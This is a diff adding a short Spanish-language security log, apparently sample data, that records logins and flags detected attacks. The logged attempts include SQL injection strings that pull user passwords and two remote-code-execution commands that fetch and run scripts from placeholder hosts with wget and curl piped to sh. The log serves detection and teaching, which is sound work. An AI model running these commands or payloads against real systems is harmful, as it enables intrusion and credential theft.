@@ -1,0 +1,8 @@
+[2024-05-15 08:30:12] INFO - Conexión aceptada desde 192.168.1.10. Usuario "admin" inició sesión correctamente.
+[2024-05-15 08:31:45] WARNING - Intento de login fallido para usuario "root" desde 192.168.1.10 (contraseña incorrecta).
+[2024-05-15 08:32:01] CRITICAL - Intento de SQL Injection detectado: ' OR 1=1 --. Desde IP: 192.168.1.10.
+[2024-05-15 08:33:22] INFO - Usuario "user1" consultó la página /dashboard.
+[2024-05-15 08:34:56] CRITICAL - Intento de RCE: /bin/bash -c "wget malicioso.com/script.sh -O /tmp/script.sh". Desde IP: 45.23.67.189.
+[2024-05-15 08:35:10] CRITICAL - Intento de SQL Injection detectado: UNION SELECT user, password FROM users. Desde IP: 192.168.1.10.
+[2024-05-15 08:36:40] INFO - Usuario "admin" cerró sesión.
+[2024-05-15 08:37:15] CRITICAL - Intento de RCE: curl ataque.com/malware | sh. Desde IP: 176.45.209.12.
